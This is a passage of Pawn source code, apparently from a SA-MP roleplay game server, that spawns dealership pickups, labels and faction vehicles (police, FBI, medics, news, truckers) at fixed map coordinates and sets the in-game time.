	for(new d = 0; d < sizeof(CarDealershipInfo); d++)
	{
		if(CarDealershipInfo[d][cdEntranceX] != 0.0 && CarDealershipInfo[d][cdEntranceY] != 0.0)
		{
			CarDealershipInfo[d][cdPickupID] = CreatePickup(1272, 1, CarDealershipInfo[d][cdEntranceX], CarDealershipInfo[d][cdEntranceY], CarDealershipInfo[d][cdEntranceZ], -1);
			if(CarDealershipInfo[d][cdOwned])
			{
	            format(text_info, sizeof(text_info),"Car Dealership %s\nOwner: %s\nID: %d", CarDealershipInfo[d][cdMessage], CarDealershipInfo[d][cdOwner], d);
	            CarDealershipInfo[d][cdTextLabel] = CreateDynamic3DTextLabel(text_info,COLOR_LIGHTBLUE,CarDealershipInfo[d][cdEntranceX], CarDealershipInfo[d][cdEntranceY], CarDealershipInfo[d][cdEntranceZ]+0.5,3.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1);
			}
			else
			{
	            format(text_info, sizeof(text_info),"Car Dealership %s For Sale\nPrice: %d\nID: %d", CarDealershipInfo[d][cdMessage], CarDealershipInfo[d][cdPrice], d);
	            CarDealershipInfo[d][cdTextLabel] = CreateDynamic3DTextLabel(text_info,COLOR_YELLOW,CarDealershipInfo[d][cdEntranceX], CarDealershipInfo[d][cdEntranceY], CarDealershipInfo[d][cdEntranceZ]+0.5,3.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1);
			}
		}
		for(new v = 0; v < MAX_DEALERSHIPVEHICLES; v++)
	    {
			if(CarDealershipInfo[d][cdVehicleModel][v] != 0)
			{
		        new carcreated = CreateVehicle(CarDealershipInfo[d][cdVehicleModel][v], CarDealershipInfo[d][cdVehicleSpawnX][v], CarDealershipInfo[d][cdVehicleSpawnY][v], CarDealershipInfo[d][cdVehicleSpawnZ][v], CarDealershipInfo[d][cdVehicleSpawnAngle][v], 0, 0, 6);
		        format(text_info, sizeof(text_info), "%s For Sale | Price: %d", GetVehicleName(carcreated), CarDealershipInfo[d][cdVehicleCost][v]);
                CarDealershipInfo[d][cdVehicleLabel][v] = CreateDynamic3DTextLabel(text_info,COLOR_LIGHTBLUE,0.0, 0.0, 0.0,8.0,INVALID_PLAYER_ID,carcreated);
                CarDealershipInfo[d][cdVehicleId][v] = carcreated;
			}
		}
	}

	gettime(time[0], time[1], time[2]);
	FixHour(time[0]);
	PSeconds = 1;
	PMinutes = time[1];
	PHours = time[0];
	time[0] = shifthour;
	ghour = shifthour;
	SetWorldTime(time[0]);

	for(new i = 0; i <= sizeof(Peds)-1; i++)
	{
		AddPlayerClass(Peds[i][0],1958.3783,1343.1572,1100.3746,269.1425,-1,-1,-1,-1,-1,-1);
	}
	for(new i = 0; i < sizeof(CreatedCars); i++)
	{
		CreatedCars[i] = INVALID_VEHICLE_ID;
	}

	//LSPD Dildo
	dildo = CreatePickup(321, 2, 261.6014, 71.2014, 1003.2422, -1);

	//LSPD Button
	lspdcopsonly = CreateButton(244.90686035156, 72.328125, 1003.9609375, 3.0); // ONLYS ONLY
	lspdeveryone = CreateButton(244.92, 73.42, 1004.27, 92.0); // People, ^^==LSPD

	CreateDynamicObject(2886, 244.90686035156, 72.328125, 1003.9609375,0,0,3.0, 20002); //lspdcopsonly button
	CreateDynamicObject(2886, 244.92, 73.42, 1004.27,0,0,92.0, 20002); //lspdeveryone button

	lspddoor1 = CreateDynamicObject(1569, 246.35150146484, 72.547714233398, 1002.640625, 0.000000, 0.000000, 0.000000); //
	lspddoor2 = CreateDynamicObject(1569, 245.03300476074, 72.568511962891, 1002.640625, 0.000000, 0.000000, 0.000000); //

	// Faction gates
	LSPDGate = CreateDynamicObject(968, 1544.6943359375, -1630.73046875, 13.27956199646, 0.000000, 90, 90); //
 	LSPDGate2 = CreateDynamicObject(971, 1588.6428222656, -1638.02734375, 15.240161895752, 0, 0, 181.03271484375);
	FBIGate1 = CreateDynamicObject(971, 320.40628051758, -1487.9129638672, 26.900407791138, 0.000000, 0.000000, 144.85501098633); //
	FBIGate2 = CreateDynamicObject(971, 283.96463012695, -1543.154296875, 27.167940139771, 0.000000, 0.000000, 326.25500488281); //

	// Faction text labels and pickups

		//arrest
	CreatePickup(1247, 23, 1528.082397, -1677.978637, 5.890625, -1); // LSPD
	CreateDynamic3DTextLabel("/arrest",COLOR_YELLOW,1528.082397, -1677.978637, 5.890625+0.6,4.0);  // LSPD
	CreatePickup(1247, 23, 1564.830932, -1652.506469, 28.395606, -1);  // LSPD roof
	CreateDynamic3DTextLabel("/arrest",COLOR_YELLOW,1564.830932, -1652.506469, 28.395606+0.6,4.0); // LSPD roof
	CreatePickup(1247, 23, 304.796508, -1526.349731, 76.539062, -1); // FBI roof
	CreateDynamic3DTextLabel("/arrest",COLOR_YELLOW,304.796508, -1526.349731, 76.539062+0.6,4.0);  // FBI roof
	CreatePickup(1247, 23, 298.313842, -1536.036865, 24.593750, -1); // FBI
	CreateDynamic3DTextLabel("/arrest",COLOR_YELLOW,298.313842, -1536.036865, 24.593750+0.6,4.0);  // FBI

	    //deliver
	CreatePickup(1247, 23, 1992.484130, -2312.814208, 13.546875, -1);
	CreateDynamic3DTextLabel("/deliver\nFor most wanted suspects",COLOR_YELLOW,1992.484130, -2312.814208, 13.546875+0.6,4.0);
	CreateDynamicObject(1681,1994.44226074,-2315.96582031,14.67000008,0.00000000,0.00000000,90.00000000); //object(ap_learjet1_01) (1)

		//impounding
    CreateDynamic3DTextLabel("Impound Yard \nType /impound to impound a vehicle",COLOR_YELLOW,1602.002197, -1608.801879, 13.662560+0.6,5.0);

    	// LSPD lockers
   	CreateDynamic3DTextLabel("/LSPD\nTo open your locker.",COLOR_DBLUE,255.386260, 77.258728, 1003.640625+0.6,4.0);

   	CreateDynamic3DTextLabel("/SAN\nTo open your locker.",COLOR_NEWS, 2653.8711, -1833.7297, -38.7244+0.6,4.0);

        //FBI lockers
   	CreateDynamic3DTextLabel("/FBI\nTo open your locker.",COLOR_DBLUE,310.3679,-1537.5204,-45.1338+0.6,4.0);///fbi

   	    // LSFMD lockers
   	CreateDynamic3DTextLabel("/LSFMD\nTo open your locker.",COLOR_LIGHTRED,1188.5157470703,-1350.9741210938, 2423.2648925781+0.6,4.0);
   	CreateDynamic3DTextLabel("/LSFMD\nTo open your locker.",COLOR_LIGHTRED,190.006729, 166.458602, 1997.859375+0.6,4.0);

   	    // /deliver
	CreatePickup(1240, 23, 1142.4733,-1326.3633,13.6259, -1);// Deliverpt
	CreatePickup(1240, 23, 1165.1564,-1368.8240,26.6502, -1);// Deliverpt
	CreatePickup(1240, 23, 2027.0599,-1410.6870,16.9922, -1);// Deliverpt
	CreatePickup(1240, 23, 2024.5742,-1382.7844,48.3359, -1);// Deliverpt
 	CreateDynamic3DTextLabel("/deliverpt",COLOR_LIGHTRED,1142.4733,-1326.3633,13.6259+0.6,4.0);///Deliverpt
   	CreateDynamic3DTextLabel("/deliverpt",COLOR_LIGHTRED,1165.1564,-1368.8240,26.6502+0.6,4.0);///Deliverpt
   	CreateDynamic3DTextLabel("/deliverpt",COLOR_LIGHTRED,2027.0599,-1410.6870,16.9922+0.6,4.0);///Deliverpt
   	CreateDynamic3DTextLabel("/deliverpt",COLOR_LIGHTRED,2024.5742,-1382.7844,48.3359+0.6,4.0);///Deliverpt

   	    // /healme
	CreatePickup(1240, 23, 1179.4012451172,-1331.5632324219,2423.0461425781, -1);
	CreateDynamic3DTextLabel("/healme \nTo cure your disease",COLOR_LIGHTRED,1179.4012451172,-1331.5632324219,2423.0461425781+0.6,4.0);
	    // /buyinsurance
	CreatePickup(1239, 23, 1169.7209472656,-1348.3218994141,2423.0461425781, -1);// /Old Insurance: 2086.4915,2826.7122,-16.1744
	CreateDynamic3DTextLabel("/buyinsurance \n To buy insurance",COLOR_YELLOW,1169.7209472656,-1348.3218994141,2423.0461425781+0.6,4.0);// Insurance

	//CreateDynamic3DTextLabel("/govl\nTo open your locker.",COLOR_YELLOW, -1221.620849, -155.842590, 4891.833007, 4.0);//  Government lockers

	// Faction vehicles

	// LSPD
	LSPDVehicles[0] = AddStaticVehicleEx(596, 1601.795898, -1684.209350, 5.631327, 90.0, 0, 1, VEHICLE_RESPAWN); // Police Car (LSPD)
	LSPDVehicles[1] = AddStaticVehicleEx(596, 1601.790527, -1688.099243, 5.611071, 90.0, 0, 1, VEHICLE_RESPAWN); // Police Car (LSPD)
	LSPDVehicles[2] = AddStaticVehicleEx(596, 1601.790649, -1692.043945, 5.627151, 90.0, 0, 1, VEHICLE_RESPAWN); // Police Car (LSPD)
	LSPDVehicles[3] = AddStaticVehicleEx(596, 1601.790527, -1696.380981, 5.617440, 90.0, 0, 1, VEHICLE_RESPAWN); // Police Car (LSPD)
	LSPDVehicles[4] = AddStaticVehicleEx(596, 1601.790161, -1700.374267, 5.618237, 90.0, 0, 1, VEHICLE_RESPAWN); // Police Car (LSPD)
	LSPDVehicles[5] = AddStaticVehicleEx(596, 1601.791015, -1704.578247, 5.613302, 90.0, 0, 1, VEHICLE_RESPAWN); // Police Car (LSPD)
	LSPDVehicles[6] = AddStaticVehicleEx(596, 1595.375122, -1710.665039, 5.629010, 0.0, 0, 1, VEHICLE_RESPAWN); // Police Car (LSPD)
	LSPDVehicles[7] = AddStaticVehicleEx(596, 1591.266113, -1711.172851, 5.562825, 0.0, 0, 1, VEHICLE_RESPAWN); // Police Car (LSPD)
	LSPDVehicles[8] = AddStaticVehicleEx(596, 1587.176269, -1711.167724, 5.559627, 0.0, 0, 1, VEHICLE_RESPAWN); // Police Car (LSPD)
	LSPDVehicles[9] = AddStaticVehicleEx(596, 1583.157104, -1711.164550, 5.575726, 0.0, 0, 1, VEHICLE_RESPAWN); // Police Car (LSPD)
	LSPDVehicles[10] = AddStaticVehicleEx(596, 1578.746948, -1711.159790, 5.579936, 0.0, 0, 1, VEHICLE_RESPAWN); // Police Car (LSPD)
	LSPDVehicles[11] = AddStaticVehicleEx(596, 1574.747192, -1711.155517, 5.616508, 0.0, 0, 1, VEHICLE_RESPAWN); // Police Car (LSPD)
	LSPDVehicles[12] = AddStaticVehicleEx(596, 1570.507080, -1711.150390, 5.631289, 0.0, 0, 1, VEHICLE_RESPAWN); // Police Car (LSPD)
	LSPDVehicles[13] = AddStaticVehicleEx(402, 1545.363403, -1684.183715, 5.776185, 90.0, 0, 0, VEHICLE_RESPAWN); // Buffalo
	LSPDVehicles[14] = AddStaticVehicleEx(402, 1545.271606, -1680.033325, 5.789134, 90.0, 0, 0, VEHICLE_RESPAWN); // Buffalo
	LSPDVehicles[15] = AddStaticVehicleEx(451, 1545.206909, -1676.062377, 5.768874, 90.0, 0, 0, VEHICLE_RESPAWN); // Turismo
	LSPDVehicles[16] = AddStaticVehicleEx(560, 1545.136840, -1671.935791, 5.796144, 90.0, 0, 79, VEHICLE_RESPAWN); // Sultan
	LSPDVehicles[17] = AddStaticVehicleEx(525, 1545.113891, -1667.590332, 5.768740, 90.0, 0, 79, VEHICLE_RESPAWN); // Tow Truck
	LSPDVehicles[18] = AddStaticVehicleEx(525, 1545.052978, -1663.159057, 5.769451, 90.0, 0, 79, VEHICLE_RESPAWN); // Tow Truck
	LSPDVehicles[19] = AddStaticVehicleEx(528, 1539.080932, -1644.956298, 6.022599, 180.0, 0, 1, VEHICLE_RESPAWN); // S.W.A.T. Van
	LSPDVehicles[20] = AddStaticVehicleEx(528, 1534.736694, -1644.953979, 6.025968, 180.0, 0, 1, VEHICLE_RESPAWN); // S.W.A.T. Van
	LSPDVehicles[21] = AddStaticVehicleEx(601, 1530.765136, -1644.953735, 5.626488, 180.0, 0, 0, VEHICLE_RESPAWN); // S.W.A.T. Van
	LSPDVehicles[22] = AddStaticVehicleEx(601, 1526.807250, -1644.952392, 5.685305, 180.0, 0, 0, VEHICLE_RESPAWN); // S.W.A.T. Van
	LSPDVehicles[23] = AddStaticVehicleEx(523, 1586.753173, -1680.919067, 5.467967, 270.0, 0, 0, VEHICLE_RESPAWN); // HPV-1000
	LSPDVehicles[24] = AddStaticVehicleEx(523, 1583.504272, -1680.935913, 5.456614, 270.0, 0, 0, VEHICLE_RESPAWN); // HPV-1000
	LSPDVehicles[25] = AddStaticVehicleEx(523, 1583.508789, -1678.958862, 5.454283, 270.0, 0, 0, VEHICLE_RESPAWN); // HPV-1000
	LSPDVehicles[26] = AddStaticVehicleEx(523, 1583.510498, -1677.093017, 5.481368, 270.0, 0, 0, VEHICLE_RESPAWN); // HPV-1000
	LSPDVehicles[27] = AddStaticVehicleEx(523, 1583.519409, -1675.270629, 5.453042, 270.0, 0, 0, VEHICLE_RESPAWN); // HPV-1000
	LSPDVehicles[28] = AddStaticVehicleEx(523, 1586.685302, -1678.958740, 5.490104, 270.0, 0, 0, VEHICLE_RESPAWN); // HPV-1000
	LSPDVehicles[29] = AddStaticVehicleEx(523, 1586.702880, -1677.099365, 5.452620, 270.0, 0, 0, VEHICLE_RESPAWN); // HPV-1000
	LSPDVehicles[30] = AddStaticVehicleEx(523, 1586.705566, -1675.270629, 5.434679, 270.0, 0, 0, VEHICLE_RESPAWN); // HPV-1000
	LSPDVehicles[31] = AddStaticVehicleEx(599, 1585.306152, -1667.855957, 6.086935, 270.0, 0, 1, VEHICLE_RESPAWN); // Police Ranger
	LSPDVehicles[32] = AddStaticVehicleEx(599, 1585.286010, -1671.934448, 6.118605, 270.0, 0, 1, VEHICLE_RESPAWN); // Police Ranger
	LSPDVehicles[33] = AddStaticVehicleEx(427, 1544.986694, -1659.187500, 6.019245, 90.0, 0, 1, VEHICLE_RESPAWN); // Enforcer
	LSPDVehicles[34] = AddStaticVehicleEx(598, 1544.987060, -1655.224243, 6.054365, 90.0, 0, 1, VEHICLE_RESPAWN); // LVPD
	LSPDVehicles[35] = AddStaticVehicleEx(598, 1544.987182, -1651.171020, 6.010422, 90.0, 0, 1, VEHICLE_RESPAWN); // LVPD
	LSPDVehicles[36] = AddStaticVehicleEx(599, 1558.675781, -1711.144897, 6.032533, 0.0, 0, 1, VEHICLE_RESPAWN); // Police Ranger
	LSPDVehicles[37] = AddStaticVehicleEx(497,1564.34960938,-1648.89172363,28.66711426,90.00000000,0,1,VEHICLE_RESPAWN); //Police Maverick
	LSPDVehicles[38] = AddStaticVehicleEx(497,1564.30908203,-1700.77612305,28.66711426,90.00000000,0,1,VEHICLE_RESPAWN); //Police Maverick

	for(new x;x<sizeof(LSPDVehicles);x++)
	{
	    format(string, sizeof(string), "LSPD %d", LSPDVehicles[x]);
	    SetVehicleNumberPlate(LSPDVehicles[x], string);
	}

	// FBI
 	FBIVehicles[0] = AddStaticVehicleEx(490,278.2950,-1535.1125,24.7221,234.8203,0,0,2000); // FBI car 1
	FBIVehicles[1] = AddStaticVehicleEx(490,281.3488,-1531.0051,24.7211,234.4913,0,0,2000); // FBI car 2
	FBIVehicles[2] = AddStaticVehicleEx(490,284.1479,-1526.7838,24.7219,235.9317,0,0,2000); // FBI car 3
	FBIVehicles[3] = AddStaticVehicleEx(402,287.9204,-1522.4076,24.4254,233.3578,0,0,2000); // FBI car 4
	FBIVehicles[4] = AddStaticVehicleEx(402,291.0083,-1518.0157,24.4255,235.8604,0,0,2000); // FBI car 5
	FBIVehicles[5] = AddStaticVehicleEx(426,294.4281,-1513.3267,24.3367,233.7115,0,0,2000); // FBI car 6
	FBIVehicles[6] = AddStaticVehicleEx(426,297.6391,-1508.7694,24.3367,233.2394,0,0,2000); // FBI car 7
	FBIVehicles[7] = AddStaticVehicleEx(482,301.1381,-1504.8762,24.7139,233.2884,0,0,2000); // FBI Car 8
	FBIVehicles[8] = AddStaticVehicleEx(415,304.2608,-1486.6423,24.2188,235.1092,0,0,2000); // FBI Car 9
    FBIVehicles[9] = AddStaticVehicleEx(415,307.1080,-1482.1565,24.2188,234.6429,0,0,2000); // FBI Car 10
    FBIVehicles[10] = AddStaticVehicleEx(487, 316.47, -1516.18, 77.24, 228.39, 0, 79, 2000); //  Levithian - FBI Roof
    FBIVehicles[11] = AddStaticVehicleEx(487, 329.79, -1500.35, 77.24, 222.55, 0, 79, 2000); //  Levithian - FBI Roof
    FBIVehicles[12] = AddStaticVehicleEx(427, 300.645629, -1490.589233, 24.723447, 233.09, 0, 0, 2000); //  FBI Enforcer
    FBIVehicles[13] = AddStaticVehicleEx(560, 294.8336, -1540.6174, 24.2991, 54.4162, 0, 0, 2000); //  FBI Sultan
    FBIVehicles[14] = AddStaticVehicleEx(560, 292.0438, -1545.2189, 24.2991, 55.1461, 0, 0, 2000); //  FBI Sultan

	// LSFMD
   	LSFMDVehicles[1] = AddStaticVehicleEx(452,721.1721,-1628.0261,-0.6700,180.6752,1,53, VEHICLE_RESPAWN); // LSFD Boat 2
	LSFMDVehicles[2] = AddStaticVehicleEx(452,720.1046,-1693.4014,-0.4581,179.7505,1,35, VEHICLE_RESPAWN); // LSFD Boat 3
	LSFMDVehicles[3] = AddStaticVehicleEx(416,1607.2472,-2153.6628,13.7036,88.4947,1,3, VEHICLE_RESPAWN); // FDA Ambulance
	LSFMDVehicles[4] = AddStaticVehicleEx(416,1590.8926,-2152.0854,13.7039,268.5291,1,3, VEHICLE_RESPAWN); // LSFMD ambulance
	LSFMDVehicles[5] = AddStaticVehicleEx(416,1590.9957,-2159.7983,13.7047,269.8668,1,3, VEHICLE_RESPAWN); // LSFMD ambulance
	LSFMDVehicles[6] = AddStaticVehicleEx(416,1591.0316,-2167.6848,13.7039,269.8569,1,3, VEHICLE_RESPAWN); // LSFMD ambulance
	LSFMDVehicles[7] = AddStaticVehicleEx(407, 1544.7987060547, -2173.884765625, 13.916874885559, 270, -1, -1, VEHICLE_RESPAWN); //Ambulance
    LSFMDVehicles[8] = AddStaticVehicleEx(407, 1544.7987060547, -2165.47265625, 13.916874885559, 270, -1, -1, VEHICLE_RESPAWN); //Ambulance
	LSFMDVehicles[9] = AddStaticVehicleEx(544, 1513.0217285156, -2173.1804199219, 13.916874885559, 90, -1, -1, VEHICLE_RESPAWN);//Ambulance
	LSFMDVehicles[10] = AddStaticVehicleEx(416, 87.18, -160.59, 2.74, 357.75, 1, 3, VEHICLE_RESPAWN);//Ambulance - LSFMD Sub Station
	LSFMDVehicles[11] = AddStaticVehicleEx(490, 97.63, -171.87, 2.75, 271.18, 3, 1, VEHICLE_RESPAWN); // LSFMD Rancher - Sub Station
	LSFMDVehicles[12] = AddStaticVehicleEx(407, 95.26, -164.77, 2.82, 269.32, 3, 1, VEHICLE_RESPAWN); // Fire Truck - Sub Station
	LSFMDVehicles[13] = AddStaticVehicleEx(563, 152.42, -167.52, 2.28, 92.43, 3, 1, VEHICLE_RESPAWN); // Raindance - Sub Station
	LSFMDVehicles[14] = AddStaticVehicleEx(416,1220.61, 301.97, 19.70, 155.82,1,3, VEHICLE_RESPAWN); // Memorial - Ambulance
	LSFMDVehicles[15] = AddStaticVehicleEx(416,1227.83, 298.53, 19.70, 155.16,1,3, VEHICLE_RESPAWN); // Memorial - Ambulance
	LSFMDVehicles[16] = AddStaticVehicleEx(563,1230.78, 318.34, 25.46, 153.57,1,3, VEHICLE_RESPAWN); // Memorial - Raindance
	LSFMDVehicles[17] = AddStaticVehicleEx(416,1609.2712,-2181.0779,13.7039,177.3877,1,3, VEHICLE_RESPAWN); // LSFD Ambulance
	LSFMDVehicles[18] = AddStaticVehicleEx(554,1580.2485,-2147.9507,13.6308,270.7723,3,1, VEHICLE_RESPAWN); // LSFD Car
	LSFMDVehicles[19] = AddStaticVehicleEx(554,1545.3405,-2183.1868,13.6328,269.7860,3,1, VEHICLE_RESPAWN); // LSFD Car 2
	LSFMDVehicles[20] = AddStaticVehicleEx(416,1179.9149,-1308.8851,13.8767,268.7781,1,3, VEHICLE_RESPAWN); //Ambulance 1
	LSFMDVehicles[21] = AddStaticVehicleEx(416,1179.3976,-1338.5197,13.9653,270.0616,1,3, VEHICLE_RESPAWN); //Ambulance 2
	LSFMDVehicles[22] = AddStaticVehicleEx(416,2036.9012,-1425.9266,17.1406,359.5312,1,3, VEHICLE_RESPAWN); //Ambulance 3
	LSFMDVehicles[23] = AddStaticVehicleEx(416,2008.3009,-1411.0936,17.1413,88.3472,1,3, VEHICLE_RESPAWN); //Ambulance 4
	LSFMDVehicles[24] = AddStaticVehicleEx(407,1545.6364,-2155.6382,13.7988,273.9738,3,1, VEHICLE_RESPAWN); //Ambulance 5
	LSFMDVehicles[25] = AddStaticVehicleEx(407,1516.0275,-2162.9231,13.7834,89.9683,3,1, VEHICLE_RESPAWN); //Ambulance 6
	LSFMDVehicles[26] = AddStaticVehicleEx(416,1606.9974,-2167.0830,13.7039,91.1709,1,3, VEHICLE_RESPAWN); //Ambulance 7
	LSFMDVehicles[27] = AddStaticVehicleEx(416,1607.3264,-2148.6665,13.7040,89.7026,1,3, VEHICLE_RESPAWN); //Ambulance 8
	LSFMDVehicles[28] = AddStaticVehicleEx(490,1616.3599,-2144.3535,13.6824,88.7370,3,1, VEHICLE_RESPAWN); // LSFMDFBIRANCHER main station
	LSFMDVehicles[29] = AddStaticVehicleEx(490,1628.9847,-2151.2844,13.6831,269.9678,3,1, VEHICLE_RESPAWN); // LSFMDFBIRANCHER sub station new
    LSFMDVehicles[30] = AddStaticVehicleEx(416,-2668.79589844,605.40057373,14.75412750,180.00000000,1,3,VEHICLE_RESPAWN); //Ambulance
	LSFMDVehicles[31] = AddStaticVehicleEx(416,-2662.53906250,605.74005127,14.75412750,180.00000000,1,3,VEHICLE_RESPAWN); //Ambulance
	LSFMDVehicles[32] = AddStaticVehicleEx(416,-2655.28808594,605.89562988,14.75412750,180.00000000,1,3,VEHICLE_RESPAWN); //Ambulance
	LSFMDVehicles[33] = AddStaticVehicleEx(407,-2021.93737793,84.03466797,28.25847435,270.00000000,3,1,VEHICLE_RESPAWN); //Firetruck
	LSFMDVehicles[34] = AddStaticVehicleEx(407,-2022.07055664,92.80475616,28.41874695,270.00000000,3,1,VEHICLE_RESPAWN); //Firetruck
	LSFMDVehicles[35] = AddStaticVehicleEx(407,-2022.19433594,76.03833008,28.25847435,270.00000000,3,11,VEHICLE_RESPAWN); //Firetruck
	LSFMDVehicles[36] = AddStaticVehicleEx(563,1633.9830,-2180.9321,14.2601,267.5514,3,1,VEHICLE_RESPAWN); // fda raindance
	LSFMDVehicles[37] = AddStaticVehicleEx(563,1489.1141,-2168.0686,14.2523,180.3227,3,1,VEHICLE_RESPAWN); // raindance 2
	LSFMDVehicles[38] = AddStaticVehicleEx(487,-2703.3201,624.0250,14.1766,180.2649, 1, 3, VEHICLE_RESPAWN);//Medic Chopper/*Maverick*/
	LSFMDVehicles[39] = AddStaticVehicleEx(487, 1610.3516,-2180.1248,19.9312,354.8875,1, 3, VEHICLE_RESPAWN);//Medic Chopper/*Maverick*/ -- in LS
	LSFMDVehicles[40] = AddStaticVehicleEx(487, 1620.5365,-2179.8254,19.9498,5.4440,1, 3, VEHICLE_RESPAWN);//Medic Chopper/*Maverick*/ -- in LS

    for(new x;x<sizeof(LSFMDVehicles);x++) {
	    format(string, sizeof(string), "LSFMD %d", LSFMDVehicles[x]);
	    SetVehicleNumberPlate(LSFMDVehicles[x], string);
	    SetVehicleToRespawn(LSFMDVehicles[x]);
	}

	/* Government vehicles
	GovVehicles[0] = AddStaticVehicleEx(409,1278.07080078,-2014.19921875,58.83128357,0.00000000,0, 0, VEHICLE_RESPAWN); //Stretch
	GovVehicles[1] = AddStaticVehicleEx(409,1278.27148438,-2024.24951172,58.83128357,0.00000000,0, 0, VEHICLE_RESPAWN); //Stretch
	GovVehicles[2] = AddStaticVehicleEx(489,1246.49230957,-2009.86267090,60.20861435,270.00000000,0, 0, VEHICLE_RESPAWN); //Rancher
	GovVehicles[3] = AddStaticVehicleEx(489,1246.25427246,-2015.10778809,60.20861435,270.00000000,0, 0, VEHICLE_RESPAWN); //Rancher
	GovVehicles[4] = AddStaticVehicleEx(489,1245.95520020,-2019.85485840,60.20861435,270.00000000,0, 0, VEHICLE_RESPAWN); //Rancher
	GovVehicles[5] = AddStaticVehicleEx(489,1245.90637207,-2024.60449219,60.20861435,270.00000000,0, 0, VEHICLE_RESPAWN); //Rancher
	GovVehicles[6] = AddStaticVehicleEx(463,1263.28942871,-2009.04907227,58.94292068,180.00000000,0, 0, VEHICLE_RESPAWN); //Freeway
	GovVehicles[7] = AddStaticVehicleEx(463,1266.04895020,-2008.95178223,58.94292068,180.00000000,0, 0, VEHICLE_RESPAWN); //Freeway
	GovVehicles[8] = AddStaticVehicleEx(487,1116.52880859,-2055.13989258,74.69468689,0.00000000,0, 0, VEHICLE_RESPAWN); //Maverick
	GovVehicles[9] = AddStaticVehicleEx(487,1115.95190430,-2019.10473633,74.69468689,180.00000000,0, 0, VEHICLE_RESPAWN); //Maverick
	GovVehicles[10] = AddStaticVehicleEx(426, 1257.2582, -2010.0286, 59.6413, 179.5065, 0, 0, VEHICLE_RESPAWN); // Premier
    GovVehicles[11] = AddStaticVehicleEx(426, 1462.2908, -1845.3002, 13.6906, 270.0187, 0, 0, VEHICLE_RESPAWN); // Premier
    GovVehicles[12] = AddStaticVehicleEx(426, 1487.0929, -1845.2926, 13.6904, 270.0193, 0, 0, VEHICLE_RESPAWN); // Premier
    GovVehicles[13] = AddStaticVehicleEx(426, 1509.3724, -1847.7166, 13.6876, 265.7939, 0, 0, VEHICLE_RESPAWN); // Premier
    GovVehicles[14] = AddStaticVehicleEx(560, 1532.8997, -1846.7733, 13.6909, 1.3031, 0, 0, VEHICLE_RESPAWN); // Sultan
    GovVehicles[15] = AddStaticVehicleEx(560, 1551.6821, -1840.1754, 13.6897, 260.9821, 0, 0, VEHICLE_RESPAWN); // Sultan
    GovVehicles[16] = AddStaticVehicleEx(560, 1554.8734, -1783.5621, 13.6906, 359.1968, 0, 0, VEHICLE_RESPAWN); // Sultan
    GovVehicles[17] = AddStaticVehicleEx(560, 1554.6436, -1718.8489, 13.6926, 88.5928, 0, 0, VEHICLE_RESPAWN); // Sultan*/

	// Made these mavericks available for public use for now
	AddStaticVehicleEx(487,1116.52880859,-2055.13989258,74.69468689,0.00000000,0, 0, VEHICLE_RESPAWN); //Maverick
	AddStaticVehicleEx(487,1115.95190430,-2019.10473633,74.69468689,180.00000000,0, 0, VEHICLE_RESPAWN); //Maverick

    /*for(new x;x<sizeof(GovVehicles);x++) {
	    format(string, sizeof(string), "GOV %d", GovVehicles[x]);
	    SetVehicleNumberPlate(GovVehicles[x], string);
	    SetVehicleToRespawn(GovVehicles[x]);
	}*/

	// SANews vehicles
    SANVehicles[0] = AddStaticVehicleEx(582,753.6042480469,-1334.6889648438,13.6949853897,180.5405273438,49,11,2000); //Newsvan
	SANVehicles[1] = AddStaticVehicleEx(582,757.6818237305,-1334.6668701172,13.6950349808,180.5405273438,49,11,2000); //Newsvan
	SANVehicles[2] = AddStaticVehicleEx(582,762.3946533203,-1334.4571533203,13.6954946518,180.6304321289,49,11,2000); //Newsvan
	SANVehicles[3] = AddStaticVehicleEx(582,766.1726684570,-1334.3752441406,13.6956758499,180.5405273438,49,11,2000); //Newsvan
	SANVehicles[4] = AddStaticVehicleEx(488, 736.0602, -1376.2152, 25.8823, 270.2599, 2, 26, 2000); // newhelisan2
	SANVehicles[5] = AddStaticVehicleEx(488,743.5921630859,-1366.7655029297,25.9572105408,0.0000000000,2,26,2000); //News Chopper

    for(new x;x<sizeof(SANVehicles);x++) {
	    format(string, sizeof(string), "SAN %d", SANVehicles[x]);
	    SetVehicleNumberPlate(SANVehicles[x], string);
	    SetVehicleToRespawn(SANVehicles[x]);
	}

    // Trucker Vehicles
   	// Trucker Vehicles
    TruckerVehicles[0] = AddStaticVehicleEx(456,-1666.42,34.28,3.65,200.00000000,-1,-1,300); //Yankee
   	TruckerVehicles[1] = AddStaticVehicleEx(456,-1663.42,36.71,3.65,200.00000000,-1,-1,300); //Yankee
   	TruckerVehicles[2] = AddStaticVehicleEx(456,-1661.53,39.08,3.55,200.00000000,-1,-1,300); //Yankee
   	TruckerVehicles[3] = AddStaticVehicleEx(414,-1659.14,41.43,3.55,200.00000000,-1,-1,300); //Mule
   	TruckerVehicles[4] = AddStaticVehicleEx(414,-1659.14,41.43,3.55,200.00000000,-1,-1,300); //Mule
   	TruckerVehicles[5] = AddStaticVehicleEx(414,-1656.75,43.79,3.55,200.00000000,-1,-1,300); //Mule
	TruckerVehicles[6] = AddStaticVehicleEx(456,-1654.30,46.18,3.55,200.00000000,-1,-1,300); //Yankee
    TruckerVehicles[7] = AddStaticVehicleEx(456,-1649.49,50.90,3.55,200.00000000,-1,-1,300); //Yankee
   	TruckerVehicles[8] = AddStaticVehicleEx(456,-1644.63,55.38,3.55,200.00000000,-1,-1,300); //Yankee
   	TruckerVehicles[9] = AddStaticVehicleEx(499,-1642.20,58.06,3.55,200.00000000,-1,-1,300); //Benson
	//TruckerVehicles[10] = AddStaticVehicleEx(499,2180.41625977,-2638.07910156,13.64687538,180.00000000,-1,-1,300); //Benson
	//TruckerVehicles[11] = AddStaticVehicleEx(499,2185.71166992,-2638.12036133,13.64687538,180.00000000,-1,-1,300); //Benson
	//TruckerVehicles[12] = AddStaticVehicleEx(414,2205.19726562,-2597.21484375,13.69090652,270.00000000,-1,-1,300); //Mule
	//TruckerVehicles[13] = AddStaticVehicleEx(499,2213.06250000,-2583.26538086,13.64687538,0.00000000,-1,-1,300); //Benson
	//TruckerVehicles[14] = AddStaticVehicleEx(456,2204.75000000,-2569.27026367,13.79687500,270.00000000,-1,-1,300); //Yankee
	//TruckerVehicles[15] = AddStaticVehicleEx(456,2239.31396484,-2644.32055664,13.79451466,90.00000000,-1,-1,300); //Yankee
	//TruckerVehicles[16] = AddStaticVehicleEx(456,2239.52050781,-2638.99414062,13.79451466,90.00000000,-1,-1,300); //Yankee
